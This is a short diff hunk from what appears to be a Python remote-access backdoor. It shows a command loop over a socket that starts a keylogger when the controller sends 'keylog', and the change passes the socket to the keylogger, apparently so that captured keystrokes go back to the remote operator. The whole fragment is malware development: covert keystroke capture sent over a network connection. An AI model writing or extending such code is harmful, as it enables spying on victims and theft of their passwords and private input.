@@ -55,7 +55,7 @@ def shell(sock):
                 sock.sendall(response.encode())
             
             elif buffer.startswith('keylog'):
-                feature.start_keylogger()
+                feature.start_keylogger(sock)
                 sock.sendall(b"Keylogger started.\n")
 
             elif buffer.startswith('stop_keylogger'):
